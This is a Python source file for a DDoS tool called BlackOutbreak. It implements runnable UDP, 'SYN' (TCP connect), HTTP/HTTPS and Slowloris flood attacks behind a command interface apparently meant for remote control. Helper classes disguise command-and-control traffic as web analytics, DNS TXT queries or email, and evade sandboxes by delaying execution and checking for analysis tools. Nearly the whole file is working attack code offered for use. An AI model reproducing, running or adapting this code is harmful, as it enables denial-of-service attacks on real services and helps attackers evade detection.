"""
BlackOutbreak DDoS Module
Provides distributed denial of service attack capabilities with stealth features
"""
import logging
import threading
import time
import socket
import random
import string
import uuid
import json
from typing import Dict, List, Any, Optional, Tuple
import os
import sys
import ssl
from datetime import datetime

# Try to import common modules from parent directory
try:
    sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
    from blackcypher.blackcypher_obfuscation import TrafficObfuscator
    from blackecho.blackecho_stealth_core import StealthCore
except ImportError:
    # Simple fallbacks for standalone operation
    class TrafficObfuscator:
        """Traffic obfuscation techniques for stealthy communication"""
        
        def __init__(self, config=None):
            """Initialize traffic obfuscator
            
            Args:
                config: Configuration dictionary
            """
            self.config = config or {}
            self.jitter_range = self.config.get("jitter_range", (0.1, 3.0))  # seconds
            self.domain_fronting_enabled = self.config.get("domain_fronting", False)
            self.domain_fronting_hosts = self.config.get("domain_fronting_hosts", [])
            self.timing_pattern = self.config.get("timing_pattern", "random")
            self.packet_padding_enabled = self.config.get("packet_padding", True)
            self.mimicry_profile = self.config.get("mimicry_profile", "browser")
            self.encoding_scheme = self.config.get("encoding_scheme", "base64")
        
        @staticmethod
        def mimic_legitimate_protocol(data, protocol="http"):
            """Disguise C2 traffic as legitimate protocol traffic
            
            Args:
                data: Raw data to send
                protocol: Protocol to mimic ("http", "dns", "smtp")
                
            Returns:
                Dictionary with disguised data
            """
            import base64
            import random
            
            encoded_data = base64.b64encode(data if isinstance(data, bytes) else data.encode()).decode('utf-8')
            
            if protocol == "http":
                return {
                    "method": "POST",
                    "url": "/api/analytics/collect",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                        "Accept-Language": "en-US,en;q=0.5",
                        "Connection": "close"
                    },
                    "body": {
                        "events": [
                            {"type": "pageview", "data": encoded_data[:len(encoded_data)//2]},
                            {"type": "custom", "name": "user_preference", "data": encoded_data[len(encoded_data)//2:]}
                        ],
                        "timestamp": random.randint(1600000000, 1700000000)
                    }
                }
            elif protocol == "dns":
                chunks = []
                for i in range(0, len(encoded_data), 63):
                    chunks.append(encoded_data[i:i+63])
                    
                return {
                    "query_type": "TXT",
                    "domain": "analytics-collector.com",
                    "subdomains": chunks
                }
            elif protocol == "smtp":
                return {
                    "from": "updates@notifications-service.com",
                    "to": "user@example.com",
                    "subject": "Your account notification",
                    "body": f"Your account has been updated.\n\nDetails: {encoded_data}"
                }
            else:
                return {"data": encoded_data}
        
        @staticmethod
        def extract_data_from_mimicked_protocol(disguised_data, protocol="http"):
            """Extract original data from disguised protocol traffic
            
            Args:
                disguised_data: Data disguised as legitimate protocol
                protocol: Protocol that was mimicked
                
            Returns:
                Original raw data
            """
            import base64
            
            if protocol == "http":
                encoded_data = disguised_data["body"]["events"][0]["data"] + disguised_data["body"]["events"][1]["data"]
            elif protocol == "dns":
                encoded_data = ''.join(disguised_data["subdomains"])
            elif protocol == "smtp":
                # Extract from email body
                parts = disguised_data["body"].split("Details: ")
                if len(parts) > 1:
                    encoded_data = parts[1]
                else:
                    raise ValueError("Could not extract data from SMTP body")
            else:
                encoded_data = disguised_data.get("data", "")
                
            return base64.b64decode(encoded_data)
        
        def apply_jitter(self):
            """Apply communication jitter delay
            
            Returns:
                Float representing seconds to delay
            """
            import random
            
            if self.timing_pattern == "random":
                return random.uniform(self.jitter_range[0], self.jitter_range[1])
            elif self.timing_pattern == "normal":
                # Approximate normal distribution with mean at midpoint of range
                mean = (self.jitter_range[0] + self.jitter_range[1]) / 2
                stddev = (self.jitter_range[1] - self.jitter_range[0]) / 4
                value = random.normalvariate(mean, stddev)
                # Clamp to range
                return max(self.jitter_range[0], min(self.jitter_range[1], value))
            elif self.timing_pattern == "burst":
                # Either very short or very long delay to simulate bursts of traffic
                if random.random() < 0.7:
                    return self.jitter_range[0] * random.uniform(1.0, 1.5)
                else:
                    return self.jitter_range[1] * random.uniform(0.8, 1.2)
            else:
                # Default to midpoint
                return (self.jitter_range[0] + self.jitter_range[1]) / 2
        
        def get_headers(self):
            """Get headers to use for HTTP communication
            
            Returns:
                Dictionary of headers
            """
            import random
            import uuid
            
            headers = {}
            
            if self.mimicry_profile == "browser":
                browsers = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
                ]
                headers["User-Agent"] = random.choice(browsers)
                headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8"
                headers["Accept-Language"] = "en-US,en;q=0.5"
                headers["Accept-Encoding"] = "gzip, deflate"
                headers["DNT"] = "1"
                headers["Connection"] = "close"
                headers["Upgrade-Insecure-Requests"] = "1"
            
            elif self.mimicry_profile == "api":
                headers["User-Agent"] = "ApiClient/1.0"
                headers["Content-Type"] = "application/json"
                headers["Accept"] = "application/json"
                headers["X-Requested-With"] = "XMLHttpRequest"
                headers["X-API-Key"] = self._generate_random_string(32)
            
            return headers
        
        def _generate_random_string(self, length):
            """Generate a random string
            
            Args:
                length: Length of string to generate
                
            Returns:
                Random string
            """
            import random
            import string
            
            chars = string.ascii_letters + string.digits
            return ''.join(random.choice(chars) for _ in range(length))
            
    class StealthCore:
        """Core stealth functionality for evading detection"""
        
        def __init__(self, config=None):
            """Initialize the stealth core
            
            Args:
                config: Configuration dictionary
            """
            self.config = config or {}
            self.sandbox_evasion_enabled = self.config.get("sandbox_evasion", True)
            self.delayed_execution = self.config.get("delayed_execution", 30)  # seconds
            self.process_injection = self.config.get("process_injection", False)
            self.target_processes = self.config.get("target_processes", ["explorer.exe", "svchost.exe"])
        
        def evade_detection(self):
            """Perform detection evasion techniques
            
            Returns:
                True if successful, False if in a detected environment
            """
            import time
            import random
            
            # Basic sandbox detection - delay execution
            if self.sandbox_evasion_enabled:
                # Add a random delay to evade automated sandbox analysis
                time.sleep(random.uniform(1, self.delayed_execution))
                
                # Check for common analysis artifacts (simplified)
                if self._check_for_analysis_environment():
                    return False
            
            return True
        
        def _check_for_analysis_environment(self):
            """Check for common analysis environment indicators
            
            Returns:
                True if analysis environment is detected
            """
            import os
            import platform
            
            # Check for suspicious process names (simplified)
            suspicious_processes = [
                "wireshark", "tcpdump", "process explorer", 
                "process monitor", "ida", "ollydbg", "immunity"
            ]
            
            if platform.system() == "Windows":
                try:
                    # Check process list on Windows
                    import wmi
                    w = wmi.WMI()
                    for process in w.Win32_Process():
                        if any(sp.lower() in process.Name.lower() for sp in suspicious_processes):
                            return True
                except:
                    pass
            
            return False


class AttackVector:
    """Base class for DDoS attack vectors"""
    
    def __init__(self, target: str, intensity: int, stealth: int, duration: int = 300):
        """Initialize the attack vector
        
        Args:
            target: Target host:port
            intensity: Attack intensity (1-10)
            stealth: Stealth level (1-10)
            duration: Attack duration in seconds (0 = indefinite)
        """
        self.target = target
        self.intensity = max(1, min(10, intensity))  # Clamp between 1 and 10
        self.stealth = max(1, min(10, stealth))      # Clamp between 1 and 10
        self.duration = duration
        self.running = False
        self.thread = None
        self.start_time = None
        self.bandwidth = 0  # Bandwidth usage in KB/s
        self.packets = 0    # Packets per second
        
        # Parse target
        if ":" in target:
            self.host, port = target.split(":", 1)
            self.port = int(port)
        else:
            self.host = target
            self.port = 80  # Default to HTTP port
    
    def start(self):
        """Start the attack vector"""
        if self.running:
            return
        
        self.running = True
        self.start_time = time.time()
        self.thread = threading.Thread(target=self._attack_loop)
        self.thread.daemon = True
        self.thread.start()
    
    def stop(self):
        """Stop the attack vector"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=5.0)
            self.thread = None
    
    def _attack_loop(self):
        """Main attack loop - to be implemented by subclasses"""
        raise NotImplementedError("Subclasses must implement _attack_loop")
    
    def get_stats(self) -> Dict[str, Any]:
        """Get attack statistics
        
        Returns:
            Dictionary with attack statistics
        """
        return {
            "bandwidth": round(self.bandwidth, 2),
            "packets": self.packets,
            "runtime": int(time.time() - (self.start_time or time.time())),
            "target": self.target,
            "intensity": self.intensity,
            "stealth": self.stealth
        }


class UdpFloodVector(AttackVector):
    """UDP flood attack vector"""
    
    def __init__(self, target: str, intensity: int, stealth: int, duration: int = 300):
        super().__init__(target, intensity, stealth, duration)
        # Calculate packet size and delay based on intensity and stealth
        self.packet_size = int(256 * (1 + (self.intensity / 5)))  # 256 - 768 bytes
        self.delay = 0.01 * (11 - self.intensity) * (self.stealth / 5)  # Higher stealth = more delay
    
    def _attack_loop(self):
        """UDP flood attack loop"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Create a randomized payload based on packet size
        payload = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(self.packet_size)).encode()
        
        sent_bytes = 0
        packet_count = 0
        last_update = time.time()
        
        try:
            end_time = time.time() + self.duration if self.duration > 0 else float('inf')
            
            while self.running and (time.time() < end_time):
                try:
                    sock.sendto(payload, (self.host, self.port))
                    sent_bytes += len(payload)
                    packet_count += 1
                    
                    # Calculate bandwidth and packet rate every second
                    if time.time() - last_update >= 1.0:
                        elapsed = time.time() - last_update
                        self.bandwidth = sent_bytes / elapsed / 1024  # KB/s
                        self.packets = packet_count / elapsed
                        sent_bytes = 0
                        packet_count = 0
                        last_update = time.time()
                    
                    # Apply delay based on stealth level
                    if self.delay > 0:
                        time.sleep(self.delay)
                        
                except Exception as e:
                    logging.error(f"UDP flood error: {e}")
                    time.sleep(1)  # Prevent tight loop on error
        finally:
            sock.close()


class SynFloodVector(AttackVector):
    """SYN flood attack vector"""
    
    def __init__(self, target: str, intensity: int, stealth: int, duration: int = 300):
        super().__init__(target, intensity, stealth, duration)
        self.delay = 0.02 * (11 - self.intensity) * (self.stealth / 3)
    
    def _attack_loop(self):
        """SYN flood attack loop"""
        sent_bytes = 0
        packet_count = 0
        last_update = time.time()
        
        try:
            end_time = time.time() + self.duration if self.duration > 0 else float('inf')
            
            while self.running and (time.time() < end_time):
                try:
                    # Create a new socket for each SYN packet
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.5)
                    
                    # Generate random source port
                    s.bind(('0.0.0.0', 0))
                    
                    # Start connection but don't complete it
                    s.connect_ex((self.host, self.port))
                    
                    # Don't close the socket - this is what causes the half-open connection
                    
                    sent_bytes += 64  # Approximate SYN packet size
                    packet_count += 1
                    
                    # Calculate bandwidth and packet rate every second
                    if time.time() - last_update >= 1.0:
                        elapsed = time.time() - last_update
                        self.bandwidth = sent_bytes / elapsed / 1024  # KB/s
                        self.packets = packet_count / elapsed
                        sent_bytes = 0
                        packet_count = 0
                        last_update = time.time()
                    
                    # Apply delay based on stealth level
                    if self.delay > 0:
                        time.sleep(self.delay)
                        
                except Exception as e:
                    pass  # Ignore connection errors - expected for SYN flood
        except Exception as e:
            logging.error(f"SYN flood error: {e}")


class HttpFloodVector(AttackVector):
    """HTTP/HTTPS flood attack vector"""
    
    def __init__(self, target: str, intensity: int, stealth: int, duration: int = 300):
        super().__init__(target, intensity, stealth, duration)
        self.use_ssl = self.port == 443
        self.delay = 0.1 * (11 - self.intensity) * (self.stealth / 4)
        
        # Generate a list of plausible paths for the target
        self.paths = [
            "/",
            "/index.html",
            "/home",
            "/login",
            "/api/v1/status",
            "/assets/main.css",
            "/images/logo.png",
            "/js/main.js"
        ]
        
        # Generate a list of plausible user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
    
    def _get_random_headers(self) -> str:
        """Generate random HTTP headers
        
        Returns:
            HTTP headers as a string
        """
        user_agent = random.choice(self.user_agents)
        headers = [
            f"GET {random.choice(self.paths)} HTTP/1.1",
            f"Host: {self.host}",
            f"User-Agent: {user_agent}",
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.5",
            "Accept-Encoding: gzip, deflate, br",
            "Connection: keep-alive",
            "Upgrade-Insecure-Requests: 1",
            "\r\n"
        ]
        return "\r\n".join(headers)
    
    def _attack_loop(self):
        """HTTP flood attack loop"""
        sent_bytes = 0
        packet_count = 0
        last_update = time.time()
        
        try:
            end_time = time.time() + self.duration if self.duration > 0 else float('inf')
            
            while self.running and (time.time() < end_time):
                try:
                    # Create socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    
                    # Connect to target
                    s.connect((self.host, self.port))
                    
                    # Wrap with SSL if needed
                    if self.use_ssl:
                        context = ssl._create_unverified_context()
                        s = context.wrap_socket(s, server_hostname=self.host)
                    
                    # Generate and send HTTP request
                    request = self._get_random_headers()
                    s.send(request.encode())
                    
                    # Don't wait for response - close immediately for more requests
                    s.close()
                    
                    sent_bytes += len(request)
                    packet_count += 1
                    
                    # Calculate bandwidth and packet rate
                    if time.time() - last_update >= 1.0:
                        elapsed = time.time() - last_update
                        self.bandwidth = sent_bytes / elapsed / 1024  # KB/s
                        self.packets = packet_count / elapsed
                        sent_bytes = 0
                        packet_count = 0
                        last_update = time.time()
                    
                    # Apply delay based on stealth level
                    if self.delay > 0:
                        time.sleep(self.delay)
                        
                except Exception as e:
                    time.sleep(0.1)  # Small delay on connection error
        except Exception as e:
            logging.error(f"HTTP flood error: {e}")


class SlowlorisVector(AttackVector):
    """Slowloris attack vector"""
    
    def __init__(self, target: str, intensity: int, stealth: int, duration: int = 300):
        super().__init__(target, intensity, stealth, duration)
        self.use_ssl = self.port == 443
        
        # Number of connections based on intensity
        self.max_connections = 50 * intensity
        self.socket_timeout = 5
        self.connections = []
        self.headers_sent = 0
    
    def _attack_loop(self):
        """Slowloris attack loop"""
        sent_bytes = 0
        packet_count = 0
        last_update = time.time()
        
        try:
            end_time = time.time() + self.duration if self.duration > 0 else float('inf')
            
            while self.running and (time.time() < end_time):
                # Create new connections until we reach max_connections
                self._create_connections()
                
                # Send partial headers to keep connections alive
                bytes_sent = self._send_headers()
                sent_bytes += bytes_sent
                packet_count += 1 if bytes_sent > 0 else 0
                
                # Calculate bandwidth and packet rate
                if time.time() - last_update >= 1.0:
                    elapsed = time.time() - last_update
                    self.bandwidth = sent_bytes / elapsed / 1024  # KB/s
                    self.packets = packet_count / elapsed
                    sent_bytes = 0
                    packet_count = 0
                    last_update = time.time()
                
                # Sleep a bit to prevent CPU overuse
                time.sleep(1)
                
        finally:
            # Clean up connections
            for sock in self.connections:
                try:
                    sock.close()
                except:
                    pass
            self.connections = []
    
    def _create_connections(self):
        """Create new connections up to max_connections"""
        current_count = len(self.connections)
        
        # Clean up dead connections
        self.connections = [s for s in self.connections if s]
        
        # Create new connections
        for _ in range(min(25, self.max_connections - len(self.connections))):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.socket_timeout)
                s.connect((self.host, self.port))
                
                if self.use_ssl:
                    context = ssl._create_unverified_context()
                    s = context.wrap_socket(s, server_hostname=self.host)
                
                # Send partial HTTP request
                s.send(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())
                self.connections.append(s)
                
            except Exception as e:
                pass
    
    def _send_headers(self) -> int:
        """Send headers to keep connections alive
        
        Returns:
            Number of bytes sent
        """
        total_sent = 0
        
        # Random incomplete headers
        headers = [
            "X-a: ",
            "User-agent: ",
            "Accept-language: ",
            "Cookie: ",
            "Referer: ",
            "Connection: "
        ]
        
        # Send one header to each connection
        for sock in self.connections:
            if sock:
                try:
                    header = random.choice(headers) + ''.join(random.choice(string.ascii_letters) for _ in range(5)) + "\r\n"
                    sock.send(header.encode())
                    total_sent += len(header)
                    self.headers_sent += 1
                except:
                    # Connection probably died, remove it
                    try:
                        sock.close()
                    except:
                        pass
                    self.connections.remove(sock)
        
        return total_sent


class BlackOutbreak:
    """Main class for BlackOutbreak DDoS module"""
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        """Initialize BlackOutbreak
        
        Args:
            config: Configuration dictionary
        """
        self.logger = logging.getLogger("BlackOutbreak")
        self.config = config or {}
        self.active_attacks = {}
        self.stealth_core = StealthCore(self.config.get("stealth", {}))
        
        # Set up logging
        self.logger.setLevel(logging.INFO)
        if not self.logger.handlers:
            handler = logging.StreamHandler()
            handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
            self.logger.addHandler(handler)
        
        self.logger.info("BlackOutbreak initialized")
    
    def start_attack(self, target: str, intensity: int, stealth: int, vectors: List[str], duration: int = 300) -> str:
        """Start a new DDoS attack
        
        Args:
            target: Target host:port
            intensity: Attack intensity (1-10)
            stealth: Stealth level (1-10)
            vectors: List of attack vectors ('udp', 'syn', 'http', 'slowloris')
            duration: Attack duration in seconds (0 = indefinite)
            
        Returns:
            Attack ID
        """
        # Generate attack ID
        attack_id = str(uuid.uuid4())[:8]
        
        # Create vectors
        attack_vectors = []
        
        if "udp" in vectors:
            attack_vectors.append(UdpFloodVector(target, intensity, stealth, duration))
        
        if "syn" in vectors:
            attack_vectors.append(SynFloodVector(target, intensity, stealth, duration))
        
        if "http" in vectors:
            attack_vectors.append(HttpFloodVector(target, intensity, stealth, duration))
        
        if "slowloris" in vectors:
            attack_vectors.append(SlowlorisVector(target, intensity, stealth, duration))
        
        # Save attack
        self.active_attacks[attack_id] = {
            "id": attack_id,
            "target": target,
            "intensity": intensity,
            "stealth": stealth,
            "vectors": vectors,
            "duration": duration,
            "start_time": time.time(),
            "attack_vectors": attack_vectors
        }
        
        # Start all vectors
        for vector in attack_vectors:
            vector.start()
        
        self.logger.info(f"Started attack {attack_id} against {target} with vectors: {','.join(vectors)}")
        
        return attack_id
    
    def stop_attack(self, attack_id: str) -> bool:
        """Stop a running attack
        
        Args:
            attack_id: Attack ID to stop
            
        Returns:
            True if attack was stopped, False if not found
        """
        if attack_id not in self.active_attacks:
            return False
        
        # Stop all vectors
        attack = self.active_attacks[attack_id]
        for vector in attack["attack_vectors"]:
            vector.stop()
        
        # Remove from active attacks
        del self.active_attacks[attack_id]
        
        self.logger.info(f"Stopped attack {attack_id}")
        
        return True
    
    def get_attack_status(self, attack_id: Optional[str] = None) -> Dict[str, Any]:
        """Get status of active attacks
        
        Args:
            attack_id: Optional attack ID to get status for
            
        Returns:
            Dictionary with attack status
        """
        # Check for expired attacks based on duration
        self._cleanup_expired_attacks()
        
        if attack_id:
            # Get status for specific attack
            if attack_id not in self.active_attacks:
                return {"error": "Attack not found"}
            
            attack = self.active_attacks[attack_id]
            
            # Collect stats from vectors
            bandwidth = 0
            packets = 0
            for vector in attack["attack_vectors"]:
                stats = vector.get_stats()
                bandwidth += stats["bandwidth"]
                packets += stats["packets"]
            
            return {
                "id": attack_id,
                "target": attack["target"],
                "vectors": ",".join(attack["vectors"]),
                "bandwidth": round(bandwidth, 2),
                "packets": int(packets),
                "runtime": int(time.time() - attack["start_time"]),
                "intensity": attack["intensity"],
                "stealth": attack["stealth"]
            }
        else:
            # Get status for all attacks
            status = []
            for attack_id, attack in self.active_attacks.items():
                # Collect stats from vectors
                bandwidth = 0
                packets = 0
                for vector in attack["attack_vectors"]:
                    stats = vector.get_stats()
                    bandwidth += stats["bandwidth"]
                    packets += stats["packets"]
                
                status.append({
                    "id": attack_id,
                    "target": attack["target"],
                    "vectors": ",".join(attack["vectors"]),
                    "bandwidth": round(bandwidth, 2),
                    "packets": int(packets),
                    "runtime": int(time.time() - attack["start_time"]),
                    "intensity": attack["intensity"],
                    "stealth": attack["stealth"]
                })
            
            return {"attacks": status}
    
    def _cleanup_expired_attacks(self):
        """Clean up expired attacks based on duration"""
        now = time.time()
        expired = []
        
        for attack_id, attack in self.active_attacks.items():
            if attack["duration"] > 0 and now - attack["start_time"] > attack["duration"]:
                expired.append(attack_id)
        
        for attack_id in expired:
            self.stop_attack(attack_id)
    
    def handle_command(self, command: str) -> str:
        """Handle command
        
        Args:
            command: Command string
            
        Returns:
            Command result
        """
        parts = command.strip().split(" ")
        cmd = parts[0].lower()
        
        try:
            if cmd == "ddos_start":
                # ddos_start target intensity stealth vectors duration
                if len(parts) < 5:
                    return "Error: Missing parameters. Usage: ddos_start target intensity stealth vectors [duration]"
                
                target = parts[1]
                intensity = int(parts[2])
                stealth = int(parts[3])
                vectors = parts[4].split(",")
                duration = int(parts[5]) if len(parts) > 5 else 300
                
                attack_id = self.start_attack(target, intensity, stealth, vectors, duration)
                return f"Attack started with ID: {attack_id}"
            
            elif cmd == "ddos_stop":
                # ddos_stop attack_id
                if len(parts) < 2:
                    return "Error: Missing attack ID. Usage: ddos_stop attack_id"
                
                attack_id = parts[1]
                if self.stop_attack(attack_id):
                    return f"Attack {attack_id} stopped"
                else:
                    return f"Error: Attack {attack_id} not found"
            
            elif cmd == "ddos_status":
                # ddos_status [attack_id]
                attack_id = parts[1] if len(parts) > 1 else None
                
                status = self.get_attack_status(attack_id)
                
                if attack_id and "error" in status:
                    return f"Error: {status['error']}"
                
                # Format status for output
                if attack_id:
                    return f"ID: {status['id']}\nTarget: {status['target']}\nVectors: {status['vectors']}\nData: {status['bandwidth']} KB/s, {status['packets']} packets/s\nRuntime: {status['runtime']}s"
                else:
                    attacks = status.get("attacks", [])
                    if not attacks:
                        return "No active attacks"
                    
                    result = []
                    for attack in attacks:
                        result.append(f"ID: {attack['id']}\nTarget: {attack['target']}\nVectors: {attack['vectors']}\nData: {attack['bandwidth']} KB/s, {attack['packets']} packets/s\nRuntime: {attack['runtime']}s\n")
                    
                    return "\n".join(result)
            
            else:
                return f"Unknown command: {cmd}"
                
        except Exception as e:
            self.logger.error(f"Error handling command: {e}")
            return f"Error: {str(e)}"


# If run directly, start a simple test
if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
    
    outbreak = BlackOutbreak()
    
    # Simple command line interface
    print("BlackOutbreak DDoS Module Test")
    print("Type 'help' for available commands, 'exit' to quit")
    
    while True:
        try:
            cmd = input("> ")
            if cmd.lower() == "exit":
                break
            elif cmd.lower() == "help":
                print("Available commands:")
                print("  ddos_start <target> <intensity> <stealth> <vectors> [duration]")
                print("  ddos_stop <attack_id>")
                print("  ddos_status [attack_id]")
                print("  exit")
            else:
                result = outbreak.handle_command(cmd)
                print(result)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
    
    # Clean up any running attacks
    for attack_id in list(outbreak.active_attacks.keys()):
        outbreak.stop_attack(attack_id)
    
    print("Exiting...")
